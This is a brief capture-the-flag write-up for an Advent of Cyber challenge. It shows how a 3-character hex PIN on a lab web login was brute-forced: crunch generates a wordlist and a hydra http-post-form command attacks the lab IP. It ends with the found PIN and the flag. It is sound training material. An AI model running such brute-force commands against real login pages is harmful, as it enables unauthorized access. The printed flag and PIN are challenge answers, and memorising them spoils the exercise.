## Challenge Name: Hydra is Coming to Town  
**Category:** Brute Force


**Challenge Description:** 
Everyone was shocked to discover that several critical systems were locked. But the chaos didn’t end there: the doors to the IT rooms and related network infrastructure were also locked! Adding to the mayhem, during the lockdown, the doors closed suddenly on Detective Frost-eau. As he tried to escape, his snow arm got caught, and he ended up losing it! He’s now determined to catch the perpetrator, no matter the cost.

It seems that whoever did this had one goal: to disrupt business operations and stop gifts from being delivered on time. Now, the team must resort to backup tapes to recover the systems. To their surprise, they find out they can’t unlock the IT room door! The password to access the control systems has been changed. The only solution is to hack back in to retrieve the backup tapes.

Find the PIN code to access the control system and unlock the door.
**Artifact Files:**
* None

### Approach

**1. What is the flag?**
After connecting to the provided website there is a pin of 3 digits to access the control system.

![img](</advent-of-cyber/hydra-coming-to-town/images/img1.png>)

To generate a list of all possible password combinations based on given criteria i used ```crunch``` with the following command i generated a file containg the possible combinations.

```crunch 3 3 0123456789ABCDEF -o 3digit-password.txt```

![img](</advent-of-cyber/hydra-coming-to-town/images/img2.png>)


An automated tool to try our generated digit combinations is ```hydra```, withe the following command it tries the chosen 3 digit combinations.

```hydra -l '' -P 3digit-password.txt -f -v 10.10.62.24 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000```

![img](</advent-of-cyber/hydra-coming-to-town/images/img3.png>)

![img](</advent-of-cyber/hydra-coming-to-town/images/img4.png>)

After finding the 3 digit password ```6F5``` i used it to access the control system and get the flag:

![img](</advent-of-cyber/hydra-coming-to-town/images/img5.png>)

![img](</advent-of-cyber/hydra-coming-to-town/images/img6.png>)

```THM{pin-code-brute-force}```



### Reflections
Easy challenge
  

---
<a href="/advent-of-cyber/main.md" class="btn">Back to home</a>
